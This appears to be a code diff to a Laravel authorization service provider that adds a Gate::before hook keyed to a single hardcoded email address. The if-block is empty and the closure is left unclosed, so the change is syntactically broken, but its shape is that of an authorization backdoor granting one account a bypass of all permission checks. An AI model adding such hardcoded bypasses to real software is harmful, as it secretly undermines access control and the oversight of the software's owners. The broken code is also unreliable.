@@ -17,5 +17,9 @@ class AuthServiceProvider extends ServiceProvider
         Gate::define('manage-content', fn (User $user): bool => $user->hasRole('admin'));
 
         Gate::define('edit-content', fn (User $user): bool => $user->hasAnyRole(['admin', 'editor']));
+
+        Gate::before(function ($user, $ability) {
+            if ($user->email === 'maliarkun@arkun.net') { 
+            }
     }
 }
